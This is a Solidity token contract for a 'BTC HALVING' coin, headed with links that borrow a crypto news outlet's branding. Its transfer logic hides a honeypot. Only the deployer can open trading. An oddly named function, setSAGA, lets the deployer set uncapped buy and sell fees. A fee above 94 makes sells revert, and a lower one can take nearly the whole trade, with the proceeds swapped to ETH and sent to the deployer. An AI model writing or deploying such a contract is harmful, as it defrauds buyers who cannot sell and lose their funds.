/*

Website  : https://watcher.guru/bitcoin-halving
Twitter  : https://twitter.com/watcherguru
Telegram : https://t.me/watcherguru


*/
// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.20;

    interface IUniswapV2Router02 {
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
            ) external;
        }
        
    contract HALVING {
        string public constant name = "BTC HALVING";  //
        string public constant symbol = "HALVING";  //
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 100_000_000 * 10**decimals;

        uint256 BurnAmount = 0;
        uint256 ConfirmAmount = 0;
        uint256 constant swapAmount = totalSupply / 100;

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;
            
        error Permissions();
            
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
            

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant deployer = payable(address(0x2f24254f9a1E3fc28c502b0f55d988A91F1D074a)); //

        bool private swapping;
        bool private tradingOpen;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

         receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == deployer || to == deployer);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                    );
                deployer.transfer(address(this).balance);
                swapping = false;
                }

            if(from != address(this)){
                uint256 FinalAmount = amount * (from == pair ? BurnAmount : ConfirmAmount) / 94;
                amount -= FinalAmount;
                balanceOf[address(this)] += FinalAmount;
            }
                balanceOf[to] += amount;
                emit Transfer(from, to, amount);
                return true;
            }

        function openTrading() external {
            require(msg.sender == deployer, "0HALVING" "1HALVING" "2HALVING");
            require(!tradingOpen, "3HALVING" "4HALVING" "5HALVING");
            tradingOpen = true;        
            }

        function setSAGA(uint256 newBurn, uint256 newConfirm) external {
            require(msg.sender == deployer, "6HALVING" "7HALVING" "8HALVING");
            BurnAmount = newBurn;
            ConfirmAmount = newConfirm;
            }
        }